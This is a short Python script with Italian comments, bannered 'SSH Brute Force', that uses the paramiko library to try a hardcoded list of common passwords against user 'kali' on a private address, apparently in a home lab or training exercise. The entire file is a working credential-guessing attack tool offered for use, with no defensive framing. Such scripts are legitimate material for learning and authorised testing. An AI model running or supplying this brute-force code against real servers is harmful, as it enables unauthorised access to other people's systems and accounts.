# Importa la libreria paramiko per gestire connessioni SSH
import paramiko
import pyfiglet

# ===== Banner all'avvio =====
ascii_banner = pyfiglet.figlet_format("SSH Brute Force", font="epic")
print(ascii_banner)

# Definisce una funzione per testare l'autenticazione SSH
def test_authentication(username, hostname, password):
    # Crea un client SSH
    client = paramiko.SSHClient()
    # Imposta la politica per accettare automaticamente chiavi sconosciute
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Prova a connettersi al server SSH
    try:
        # Tenta la connessione con username, hostname e password
        client.connect(hostname, username=username, password=password, timeout=3)
        # Se la connessione ha successo, stampa le credenziali corrette
        print(f"Authentication successful: {username}:{password}")
        # Ritorna True se la connessione è riuscita
        return True
    # Gestisce il caso di password errata
    except paramiko.AuthenticationException:
        # Stampa che l’autenticazione è fallita
        print(f"Authentication failed: {username}:{password}")
        # Ritorna False se la password non funziona
        return False
    # Chiude sempre la connessione SSH indipendentemente dal risultato
    finally:
        client.close()

# Lista di password da testare
passwords = ["password", "dragon", "monkey", "asroma", "ciao", "1927", "abcd", "0000", "1234"]

# Ciclo attraverso tutte le password nella lista
for p in passwords:
    # Chiama la funzione test_authentication con username "kali" e l’IP del server
    # Se la connessione ha successo (ritorna True), interrompe il ciclo
    if test_authentication("kali", "192.168.1.102", p):
        break
  